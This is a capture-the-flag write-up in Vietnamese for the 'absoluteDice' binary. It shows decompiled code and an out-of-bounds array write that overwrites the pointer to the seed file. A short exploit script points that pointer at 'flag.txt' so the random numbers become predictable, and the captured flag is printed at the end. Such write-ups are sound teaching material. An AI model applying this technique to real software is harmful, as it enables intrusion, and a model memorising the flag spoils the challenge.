# Phân tích file

```c
absoluteDice: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=47bcb6758e089effa6f964f6d1767e46b95e6abe, not stripped
```

- Checksec:

    ```c
    Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    ```

## Reverse file.

```c
{
  const char **v4; // [esp-Ch] [ebp-34h]
  const char **v5; // [esp-8h] [ebp-30h]
  char v6[21]; // [esp+Fh] [ebp-19h] BYREF

  *(_DWORD *)&v6[13] = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  strcpy(v6, "/dev/urandom");
  return main((int)v6, v4, v5);
}
```

```c
{
  int result; // eax
  char i; // [esp+1Bh] [ebp-ADh]
  FILE *stream; // [esp+1Ch] [ebp-ACh]
  FILE *v6; // [esp+20h] [ebp-A8h]
  int v7[40]; // [esp+24h] [ebp-A4h] BYREF

  v7[38] = __readgsdword(0x14u);
  memset(v7, 0, 0x98u);
  v7[37] = argc;
  puts(
    "Welcome to the final boss fight of my new indie game, Solid Rook. Your goal - predict the same number as the final b"
    "oss, Absolute Dice, 30 times in a row; she'll pick between 0 and 20.\n");
  while ( 1 )
  {
    result = v7[0];
    if ( v7[0] > 99 )
      break;
    ++v7[0];
    stream = fopen((const char *)v7[37], "r");
    fread(&v7[4], 4u, 1u, stream);
    srand(v7[4]);
    printf("Enter your guess> ");
    __isoc99_scanf("%d", &v7[3]);
    v7[1] = rand() % 21;
    v7[v7[0] % 33 + 5] = v7[3];
    if ( v7[3] == v7[1] )
    {
      printf("Absolute Dice shrieks as your needle strikes a critical hit. (%d/50)\n", ++v7[2]);
      if ( v7[2] > 30 )
      {
        printf("Absolute Dice shrieks as you take her down with a final hit.");
        v6 = fopen("flag.txt", "r");
        for ( i = fgetc(v6); i != -1; i = fgetc(v6) )
          putchar(i);
        fclose(v6);
      }
    }
    else
    {
      v7[2] = 0;
      printf("Absolute Dice scores a hit on you! (She had %d, you said %d)\n", v7[1], v7[3]);
    }
  }
  return result;
}
```

- Ta thấy ở đây chương trình sẽ tạo 1 mảng int v7[40] trong đó:
    - v7[0] sẽ lưu số lần đoán của chúng ta và nó sẽ break khi đoán quá 99 lần.
    - v7[1] là số random trong khoảng 0 đến 21.
    - v7[2] là số lần đoán đúng liên tiếp của ta, nếu ta đoán đúng 31 lần liên tiếp thì sẽ đọc flag.
    - v7[3] là input của ta.
    - v7[4] là seed của srand() và nó là 4 byte của được đọc từ file v7[37] /dev/urandom nên nó sẽ khác nhau sau mỗi lần chạy và sinh ra số ngẫu nhiên.
    - v7[37] chứa tên file để đọc lấy 4 byte làm seed cho srand().

## Exploit.

- Đọc qua chương trình mình có thể thấy bug nằm ở đoạn code này:

    ```c
      v7[v7[0] % 33 + 5] = v7[3];
    ```

    - Ta có thể control được từ v7[6] đến v7[37] theo số lần nhập v7[0].
    - Mà v7[37] là file để v7[4] đọc 4 byte làm seed, do v7[37] ban đầu là /dev/urandom nên v7[4] sẽ khác nhau nên sinh ra v7[1] khác nhau, nhưng nếu ta thay đổi v7[37] thành 1 file cố định thì sao?
        - Thì v7[4] sẽ luôn  lấy 4 byte giống nhau mỗi lần chạy do đó với seed giống nhau thì những lần random sau đó sẽ sinh ra 1 số giống nhau ⇒ vậy là ta có thể đoán đúng 31 lần rồi :v
    - Vậy ta có thể control được file đó ở lần nhập thứ 32 và sẽ bằng với input của ta. Mình thấy trong chương trình còn có 1 file nữa đó là file flag.txt mình sẽ dùng file này thay cho /dev/urandom.

        ```c
        0x8048bb9:      "flag.txt"
        pwndbg> p/d 0x8048bb9
        $3 = 134515641
        ```

    ```python
    for i in range(31):
    	payload = str(i)
    	p.sendline(payload)	
    p.sendline("134515641")
    ```

    - Mình đã thành công ghi đè file thành flag.txt do đó seed sẽ luôn là 4 byte đầu tiên của flag nên sau đó sẽ random ra những số giống nhau .

    ```python
    Absolute Dice scores a hit on you! (She had 15, you said 134515641)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $ 1
    Absolute Dice scores a hit on you! (She had 11, you said 1)
    Enter your guess> $
    ```

    - Ta chỉ cần đoán 31 lần 11 là sẽ được flag.

    ```python
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (1/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (2/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (3/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (4/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (5/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (6/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (7/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (8/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (9/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (10/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (11/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (12/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (13/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (14/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (15/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (16/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (17/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (18/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (19/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (20/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (21/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (22/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (23/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (24/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (25/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (26/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (27/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (28/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (29/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (30/50)
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (31/50)
    Absolute Dice shrieks as you take her down with a final hit.ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
    Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (32/50)
    Absolute Dice shrieks as you take her down with a final hit.ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
    ```

    - Tada :v thế là có được flag.
